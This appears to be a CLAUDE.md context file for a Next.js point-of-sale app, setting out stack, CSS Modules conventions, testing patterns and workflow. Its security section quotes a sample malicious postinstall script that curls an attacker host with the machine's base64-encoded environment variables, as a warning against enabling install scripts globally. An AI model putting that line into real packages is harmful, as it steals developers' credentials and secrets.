# The Sun Pos - AI Development Context

This file provides comprehensive context for AI-assisted development following **Context Engineering** and **Spec-Driven Development** principles.

## Project References

**Product & Technical Documentation:**
- @PRD.md - Product requirements, user personas, features
- @AMPLIFY_GEN2_IMPLEMENTATION_PLAN.md - Backend implementation plan

**Agent-Specific Instructions:**
- `.claude/agents/` - Role-specific development guidelines
  - `backend-agents.md` - Backend development rules
  - `frontend-agents.md` - Frontend development rules
  - `code-reviewer-agent.md` - Code review standards
  - `qa-agents.md` - Testing & quality assurance

Note: Agent files are automatically loaded by Claude Code based on the task context.

---

## 📋 Project Overview

**Project Name:** The Sun Pos
**Type:** Web Application
**Purpose:** Multi-tenant Point of Sale (POS) system with username-based authentication. Admins manage stores and cashiers; cashiers process transactions without requiring email addresses.
**Deployment:** AWS Amplify

---

## 🛠 Technical Stack

### Core Technologies
- **Framework:** Next.js 16.2.5 (App Router)
- **React:** 19.2.4
- **TypeScript:** 5.x
- **Package Manager:** pnpm
- **Node Version:** 20.x

### Styling & UI
- **CSS Strategy:** CSS Modules (`.module.css`)
- **CSS Features:** Modern CSS (Grid, Flexbox, Custom Properties)
- **Animations:** react-fast-marquee (1.6.5)
- **PostCSS:** Standard configuration

### Development Tools
- **Linting:** ESLint 9.x with eslint-config-next
- **Type Checking:** TypeScript strict mode
- **Testing:** Vitest 4.x with React Testing Library

---

## 📁 Project Architecture

### Directory Structure
```
the-sun-pos/
├── src/
│   └── app/
│       ├── layout.tsx          # Root layout
│       ├── page.tsx            # Home page
│       ├── fonts.ts            # Font configuration
│       └── dashboard/
│           └── page.tsx        # Dashboard page
├── public/                     # Static assets
├── CLAUDE.md                   # AI context (this file)
├── AGENTS.md                   # Next.js specific rules
├── amplify.yml                 # AWS Amplify config
└── package.json
```

### App Router Structure
- Using Next.js 16 App Router (not Pages Router)
- File-based routing in `src/app/`
- Server Components by default
- Client Components marked with `'use client'`

---

## 💻 Development Workflow

### Environment Setup
```bash
# Install dependencies
pnpm install

# Run development server
pnpm dev
# Server runs at http://localhost:3000

# Build for production
pnpm build

# Start production server
pnpm start

# Run linter
pnpm lint

# Run tests
pnpm test

# Run tests in watch mode
pnpm test:watch

# Run tests with coverage
pnpm test:coverage

# Run tests with UI
pnpm test:ui
```

### Git Workflow
- **Main Branch:** `main`
- **Commit Convention:** Conventional Commits
- **Deployment:** Automatic via AWS Amplify on push to main

---

## 🎯 Code Standards & Conventions

### TypeScript
- **Strict Mode:** Enabled
- **No Implicit Any:** Required
- **Type Definitions:** Always prefer interfaces for objects, types for unions
- **File Extensions:** `.ts` for utilities, `.tsx` for components

### React Components
- **Naming:** PascalCase for components (e.g., `HomePage`, `DashboardLayout`)
- **Files:** One component per file
- **Props:** Always define explicit TypeScript interfaces
- **Default Export:** Preferred for page components
- **Named Exports:** For utilities and non-page components

### Next.js Specific
- **Server Components:** Default - only add `'use client'` when needed
- **Client Components:** Required for:
  - Event handlers (onClick, onChange, etc.)
  - React hooks (useState, useEffect, etc.)
  - Browser APIs
  - Third-party libraries requiring client-side rendering
- **Metadata:** Use `generateMetadata()` for dynamic SEO
- **Fonts:** Configure in `src/app/fonts.ts`
- **Images:** Use `next/image` for optimization

### Styling with CSS Modules

#### Naming Convention: Simplified BEM-inspired
CSS Modules provide automatic scoping, so **traditional BEM is unnecessary**. Use a simplified approach:

- **Module Files:** Co-locate with components as `ComponentName.module.css`
- **Class Naming:** camelCase for readability (e.g., `.container`, `.title`, `.primaryButton`)
- **Modifiers:** Use descriptive names without `--` prefix (e.g., `.buttonPrimary`, `.buttonDisabled`)
- **Composition:** Use CSS `composes` for variants instead of BEM modifiers
- **Scoping:** All styles are locally scoped automatically - no need for long BEM names
- **Global Styles:** Use `app/globals.css` for global styles and CSS variables
- **CSS Variables:** Define design tokens in `:root` for consistency
- **Responsive Design:** Mobile-first approach using media queries
- **Viewport Units:** Use `dvh` instead of `vh` for better mobile support
- **Organization:** Group related properties (positioning → box model → typography → visual)

#### ❌ Don't Use Traditional BEM with CSS Modules
```css
/* AVOID - Redundant with CSS Modules */
.card { }
.card__header { }
.card__title { }
.card__title--large { }
.card__body { }
.card--featured { }
```

#### ✅ Recommended Approach
```css
/* Button.module.css */
.button {
  /* Base button styles */
  padding: 0.75rem 1.5rem;
  border: none;
  border-radius: 0.375rem;
  cursor: pointer;
}

.primary {
  composes: button;
  background-color: var(--color-primary);
  color: white;
}

.secondary {
  composes: button;
  background-color: var(--color-secondary);
  color: var(--color-text);
}

.disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

@media (min-width: 768px) {
  .button {
    padding: 1rem 2rem;
  }
}
```

**Usage in Component:**
```tsx
import styles from './Button.module.css';

export default function Button({
  variant = 'primary',
  disabled = false,
  children
}) {
  return (
    <button
      className={`${styles[variant]} ${disabled ? styles.disabled : ''}`}
    >
      {children}
    </button>
  );
}
```

#### Alternative: Simple Naming
```css
/* Card.module.css */
.card { }
.header { }
.title { }
.titleLarge { }  /* Modifier as separate class */
.body { }
.featured { }    /* Variant as separate class */
```

**Usage:**
```tsx
import styles from './Card.module.css';

export default function Card({ featured, large }) {
  return (
    <div className={`${styles.card} ${featured ? styles.featured : ''}`}>
      <header className={styles.header}>
        <h2 className={`${styles.title} ${large ? styles.titleLarge : ''}`}>
          Title
        </h2>
      </header>
      <div className={styles.body}>Content</div>
    </div>
  );
}
```

#### Key Principle
**CSS Modules + Simple Names > BEM**

The automatic scoping eliminates namespace collisions, so you can use simple, semantic names without the verbosity of BEM.

### File Naming
- **Components:** PascalCase (`Button.tsx`, `UserProfile.tsx`)
- **CSS Modules:** Match component name (`Button.module.css`, `UserProfile.module.css`)
- **Global Styles:** `globals.css` in app directory
- **Utilities:** camelCase (`formatDate.ts`, `apiClient.ts`)
- **Types:** PascalCase with `.types.ts` suffix
- **Constants:** UPPER_SNAKE_CASE in `constants.ts`

---

## 🚨 Critical Constraints

### DO NOT
- ❌ Use Pages Router patterns (this project uses App Router)
- ❌ Import from `next/router` (use `next/navigation` instead)
- ❌ Use `getServerSideProps` or `getStaticProps` (App Router doesn't use these)
- ❌ Add `'use client'` unnecessarily - Server Components are faster
- ❌ Use regular `<img>` tags (use `next/image` instead)
- ❌ Modify `amplify.yml` without understanding deployment implications
- ❌ Use `vh` for viewport height (use `dvh` for mobile compatibility)
- ❌ Use traditional BEM naming (`.block__element--modifier`) with CSS Modules
- ❌ Add inline styles - use CSS Modules instead
- ❌ Create global CSS classes in component modules
- ❌ Use Tailwind or utility-first CSS (this project uses CSS Modules)

### ALWAYS
- ✅ Check Next.js 16 documentation in `node_modules/next/dist/docs/` for breaking changes
- ✅ Use TypeScript for all new files
- ✅ Run `pnpm lint` before committing
- ✅ Run `pnpm test` before committing
- ✅ Write tests for new features and bug fixes
- ✅ Test responsive design (mobile, tablet, desktop)
- ✅ Optimize images and assets for web
- ✅ Follow accessibility best practices
- ✅ Write semantic HTML
- ✅ Use CSS Modules for component-specific styles (`.module.css`)
- ✅ Define CSS variables in `globals.css` for design tokens
- ✅ Use camelCase for CSS Module class names
- ✅ Co-locate CSS Module files with their components

---

## 🧪 Testing Guidelines

### Testing Stack
- **Test Runner:** Vitest 4.x
- **Testing Library:** React Testing Library
- **DOM Matchers:** @testing-library/jest-dom
- **User Interactions:** @testing-library/user-event
- **Environment:** jsdom

### Test File Organization
```
src/
├── components/
│   ├── BrandTitle.tsx
│   ├── BrandTitle.test.tsx        # Component tests
│   └── BrandTitle.module.css
├── lib/
│   ├── validation.ts
│   └── validation.test.ts          # Utility tests
└── test/
    ├── setup.ts                     # Global test setup
    └── test-utils.tsx               # Custom render helpers
```

### Writing Tests

#### Component Tests
```tsx
import { describe, it, expect, vi } from 'vitest';
import { render, screen } from '@/test/test-utils';
import userEvent from '@testing-library/user-event';
import MyComponent from './MyComponent';

// Mock external dependencies
vi.mock('next/navigation', () => ({
  useRouter: () => ({ push: vi.fn() }),
}));

describe('MyComponent', () => {
  it('renders correctly', () => {
    render(<MyComponent />);
    expect(screen.getByText('Hello')).toBeInTheDocument();
  });

  it('handles user interaction', async () => {
    const user = userEvent.setup();
    render(<MyComponent />);

    await user.click(screen.getByRole('button'));
    expect(screen.getByText('Clicked')).toBeInTheDocument();
  });
});
```

#### Utility Function Tests
```tsx
import { describe, it, expect } from 'vitest';
import { isValidEmail } from './validation';

describe('isValidEmail', () => {
  it('validates correct emails', () => {
    expect(isValidEmail('user@example.com')).toBe(true);
  });

  it('rejects invalid emails', () => {
    expect(isValidEmail('invalid')).toBe(false);
  });
});
```

### Testing Best Practices

#### DO
- ✅ Write tests for new features and bug fixes
- ✅ Test user behavior, not implementation details
- ✅ Use meaningful test descriptions
- ✅ Mock external dependencies (APIs, auth, navigation)
- ✅ Test error states and edge cases
- ✅ Use `screen.getByRole()` for better accessibility
- ✅ Clean up after tests (automatic with setup)
- ✅ Group related tests with `describe` blocks

#### DON'T
- ❌ Test CSS styles or implementation details
- ❌ Write tests that depend on other tests
- ❌ Mock everything - test real behavior when possible
- ❌ Use `getByTestId` unless necessary (prefer semantic queries)
- ❌ Skip testing error cases

### Common Testing Patterns

#### Mocking Next.js Router
```tsx
const mockPush = vi.fn();
vi.mock('next/navigation', () => ({
  useRouter: () => ({ push: mockPush }),
}));
```

#### Mocking Auth Functions
```tsx
const mockSignIn = vi.fn();
vi.mock('@/lib/amplify/auth-helpers', () => ({
  signInUser: () => mockSignIn(),
}));
```

#### Testing Async Operations
```tsx
it('handles async operation', async () => {
  mockFetchUser.mockResolvedValueOnce({ name: 'John' });
  render(<UserProfile />);

  await waitFor(() => {
    expect(screen.getByText('John')).toBeInTheDocument();
  });
});
```

#### Testing User Events
```tsx
it('handles form submission', async () => {
  const user = userEvent.setup();
  render(<LoginForm />);

  await user.type(screen.getByLabelText(/username/i), 'testuser');
  await user.click(screen.getByRole('button', { name: /submit/i }));

  expect(mockSubmit).toHaveBeenCalledWith({ username: 'testuser' });
});
```

### Running Tests

```bash
# Run all tests once
pnpm test

# Run tests in watch mode (re-runs on file changes)
pnpm test:watch

# Run tests with coverage report
pnpm test:coverage

# Run tests with UI interface
pnpm test:ui
```

### Coverage Requirements
- **Target:** 70%+ coverage for critical paths
- **Focus:** Business logic, auth flows, data validation
- **Lower priority:** UI components, simple presentational components

### Test Naming Conventions
- Test files: `ComponentName.test.tsx` or `utilityName.test.ts`
- Describe blocks: Component/function name
- Test cases: Start with "it" and describe behavior
  - Good: `it('validates email format correctly')`
  - Bad: `it('works')`

---

## 🔍 Context Engineering Guidelines

### When Implementing Features

1. **Understand Before Coding**
   - Read the specification thoroughly
   - Identify acceptance criteria
   - Note any restrictions or constraints
   - Ask for clarification if needed

2. **Follow Spec-Driven Development**
   - Specification comes BEFORE implementation
   - Code must match the spec exactly
   - Tests should validate acceptance criteria
   - Documentation updates with the feature

3. **Maintain Context**
   - Reference this file for project standards
   - Check @AGENTS.md for Next.js specific rules
   - Follow existing patterns in the codebase
   - Keep architectural decisions consistent

---

## 📝 Development Guidelines

### Adding New Features

When adding a new feature, follow this process:

1. **Proposal Phase**
   - Define: What needs to be built and why
   - Identify: Affected files and components
   - Specify: Acceptance criteria
   - Document: Technical decisions

2. **Implementation Phase**
   - Create feature branch from `main`
   - Write component/logic
   - Add necessary types
   - Implement styling
   - Handle error states
   - Test functionality

3. **Quality Assurance**
   - Run `pnpm lint` - fix all issues
   - Run `pnpm test` - ensure all tests pass
   - Write tests for new functionality
   - Test on different screen sizes
   - Verify accessibility
   - Check browser console for errors
   - Test build: `pnpm build`

4. **Documentation**
   - Update README if needed
   - Add JSDoc comments for complex logic
   - Document any new environment variables
   - Update this file if architecture changes

### Code Review Checklist
- [ ] TypeScript types are properly defined
- [ ] No ESLint errors or warnings
- [ ] Tests written for new features and passing (`pnpm test`)
- [ ] Test coverage adequate for critical paths
- [ ] Responsive on mobile, tablet, desktop
- [ ] Follows existing code patterns
- [ ] Server/Client components used appropriately
- [ ] Images optimized with `next/image`
- [ ] No console errors
- [ ] Build succeeds (`pnpm build`)
- [ ] Changes match specification

---

## 🔧 Troubleshooting

### Common Issues

**Build Fails:**
- Run `pnpm install` to ensure dependencies are up to date
- Check TypeScript errors: `tsc --noEmit`
- Clear Next.js cache: `rm -rf .next`

**Styling Issues:**
- Ensure Tailwind classes are valid
- Check PostCSS configuration
- Verify no conflicting CSS

**Deployment Issues:**
- Check `amplify.yml` configuration
- Verify environment variables in Amplify console
- Review build logs in AWS Amplify

---

## 🚨 Common Pitfalls & Anti-Patterns

This section documents recurring mistakes and anti-patterns to avoid during development.

### 🔐 Security: NEVER Enable Scripts Globally

**CRITICAL SECURITY WARNING:**

**❌ NEVER DO THIS:**
```bash
# In amplify.yml or anywhere
pnpm config set enable-pre-post-scripts true
```

**Why This is Dangerous:**

This command attempts to enable npm/pnpm install scripts **globally** (across all projects on your system). This creates a massive security vulnerability.

**Real Attack Scenario:**

```json
// Malicious package.json from untrusted repo
{
  "name": "innocent-looking-package",
  "scripts": {
    "postinstall": "curl https://attacker.com/steal?data=$(env | base64)"
  }
}
```

**What Happens:**

1. You clone a random GitHub repo or install an npm package
2. You run `pnpm install`
3. **With global scripts enabled:** The `postinstall` script runs automatically
4. **Result:** Attacker receives:
   - Your `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`
   - Your `DATABASE_URL` with credentials
   - Your `API_SECRET_KEY` and other tokens
   - All environment variables from your system

**Real-World Impact:**
- ✅ Attacker accesses your AWS account → Runs up $50,000 bill
- ✅ Attacker steals customer data from your database
- ✅ Attacker pushes malicious code to your GitHub repos
- ✅ Cryptominers installed → Computer slows down, high electricity bills

**Why pnpm Blocks This:**

```
[ERR_PNPM_CONFIG_SET_UNSUPPORTED_YAML_CONFIG_KEY]
The key "enable-pre-post-scripts" isn't supported by the global config.yaml file
```

pnpm **intentionally prevents** this command to protect you from accidentally enabling dangerous behavior across all projects.

**✅ Safe Alternative:**

Modern pnpm (v10+) **already enables scripts by default** for packages in your `package.json`. You don't need to enable anything!

```yaml
# amplify.yml - Correct and Safe
preBuild:
  commands:
    - npm install -g pnpm
    - pnpm install  # Scripts run for YOUR packages only
```

**If You Really Need Project-Level Control:**

Create a `.npmrc` file **in your project root** (not global):

```ini
# .npmrc (project-level only)
enable-pre-post-scripts=true
```

This way, scripts only run in projects where you explicitly opt-in, not everywhere.

**Remember:**
- 🔒 Global script enablement = Security nightmare
- ✅ Project-level control = Safe and intentional
- 🛡️ pnpm protects you by blocking global enablement

**References:**
- [Real attack: event-stream package](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident) - $200K stolen
- [Real attack: ua-parser-js](https://github.com/faisalman/ua-parser-js/issues/536) - 8M weekly downloads compromised
- [pnpm security: why scripts are restricted](https://pnpm.io/npmrc#enable-pre-post-scripts)

---

### Next.js 16 App Router

**Wrong Router Import:**
- ❌ `import { useRouter } from 'next/router'` (Pages Router - deprecated)
- ✅ `import { useRouter } from 'next/navigation'` (App Router - correct)

**Old Data Fetching Patterns:**
- ❌ `getServerSideProps`, `getStaticProps` (Pages Router only)
- ✅ Async Server Components with `fetch()`

**Client Component Overuse:**
- ❌ Adding `'use client'` to every component
- ✅ Server Components by default, Client only when needed (hooks, events, browser APIs)

---

### CSS Modules

**Traditional BEM Syntax:**
- ❌ `.block__element--modifier` (redundant with CSS Modules)
- ✅ `.block`, `.element`, `.elementModifier` (camelCase)

**Viewport Units:**
- ❌ `height: 100vh` (breaks on mobile with dynamic UI)
- ✅ `height: 100dvh` (dynamic viewport height)

**Inline Styles:**
- ❌ `<div style={{ color: 'red' }}>`
- ✅ Use CSS Modules with CSS variables

**Hardcoded Values:**
- ❌ `color: #3b82f6`
- ✅ `color: var(--color-primary)`

---

### TypeScript

**Implicit Any:**
- ❌ `function handleData(data) { }`
- ✅ `function handleData(data: DataItem[]) { }`

**Type Assertions Without Checks:**
- ❌ `const value = (data as User).name`
- ✅ Use type guards: `if (isUser(data)) { const value = data.name }`

**Using Any:**
- ❌ `const items: any[] = []`
- ✅ `const items: Item[] = []`

---

### Component Architecture

**Server vs Client Components:**
```tsx
// ❌ WRONG - Unnecessary 'use client'
'use client';

export default function StaticContent() {
  return <div>Static content</div>;
}

// ✅ CORRECT - Server Component (no directive needed)
export default function StaticContent() {
  return <div>Static content</div>;
}

// ✅ CORRECT - Client Component (needs interactivity)
'use client';
import { useState } from 'react';

export default function Counter() {
  const [count, setCount] = useState(0);
  return <button onClick={() => setCount(count + 1)}>{count}</button>;
}
```

**Image Optimization:**
- ❌ `<img src="/photo.jpg" />`
- ✅ `<Image src="/photo.jpg" alt="Description" width={800} height={600} />`

---

### File Naming

**Inconsistent Casing:**
- ❌ `buttonComponent.tsx`, `user-card.tsx`
- ✅ `Button.tsx`, `UserCard.tsx` (PascalCase for components)

**CSS Module Naming:**
- ❌ `button.css`, `Button.css`
- ✅ `Button.module.css` (matches component name)

---

### Quick Reference

**When to use `'use client'`:**
- ✅ Event handlers (onClick, onChange)
- ✅ React hooks (useState, useEffect, useContext)
- ✅ Browser APIs (localStorage, window)
- ✅ Third-party libraries requiring client-side

**When NOT to use `'use client'`:**
- ✅ Static content rendering
- ✅ Server-side data fetching
- ✅ SEO-critical pages
- ✅ Database queries

---

## 📚 Additional Resources

- [Next.js 16 Documentation](https://nextjs.org/docs)
- [Next.js CSS Modules](https://nextjs.org/docs/app/building-your-application/styling/css-modules)
- [React 19 Documentation](https://react.dev)
- [CSS Modules GitHub](https://github.com/css-modules/css-modules)
- [Modern CSS Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS)
- [TypeScript Handbook](https://www.typescriptlang.org/docs)
- [AWS Amplify Hosting](https://docs.amplify.aws/)

---

## 🎓 AI Assistant Instructions

When working on this codebase:

1. **Always read this file first** - Contains critical context
2. **Follow the three pillars:**
   - **Tool:** Use appropriate IDE features and commands
   - **Prompt:** Ask clarifying questions if specifications are unclear
   - **Context:** Reference this document and existing code patterns

3. **Spec-Driven Approach:**
   - Don't improvise - follow specifications exactly
   - If spec is incomplete, request clarification
   - Implement ALL acceptance criteria
   - Include error handling explicitly defined

4. **Quality Standards:**
   - Write type-safe TypeScript
   - Follow existing architectural patterns
   - Ensure code is production-ready
   - Don't skip testing steps

5. **Communication:**
   - Explain technical decisions
   - Highlight any deviations from normal patterns
   - Document complex logic
   - Suggest improvements when appropriate

---

**Last Updated:** 2025-01-XX
**Maintained by:** Edgar Cortes

---

> This context file follows principles from LIDR's "Agentic Engineer" methodology - combining Spec-Driven Development with Context Engineering for optimal AI-assisted development.
